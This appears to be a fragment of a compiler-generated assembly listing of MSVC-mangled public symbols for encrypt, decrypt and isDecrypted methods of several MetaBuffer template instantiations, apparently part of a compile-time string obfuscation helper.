PUBLIC	?isDecrypted@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@QEBA_NXZ ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@@std@@@@AEBAEE@Z ; MetaBuffer<29,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@QEBA_NXZ ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@AEBAEE@Z ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@@std@@@@AEBAEE@Z ; MetaBuffer<17,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@QEBA_NXZ ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@AEBAEE@Z ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GF@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@@std@@@@AEBAEE@Z ; MetaBuffer<101,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEBA_NXZ ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CJ@$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z ; MetaBuffer<41,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@QEBA_NXZ ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@AEBAEE@Z ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EP@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@@std@@@@AEBAEE@Z ; MetaBuffer<79,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@QEBA_NXZ ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GN@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@@std@@@@AEBAEE@Z ; MetaBuffer<109,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@QEBA_NXZ ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@AEBAEE@Z ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GL@$0DK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@@std@@@@AEBAEE@Z ; MetaBuffer<107,58,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0GB@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@@std@@@@QEBA_NXZ ; MetaBuffer<97,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91> >::isDecrypted
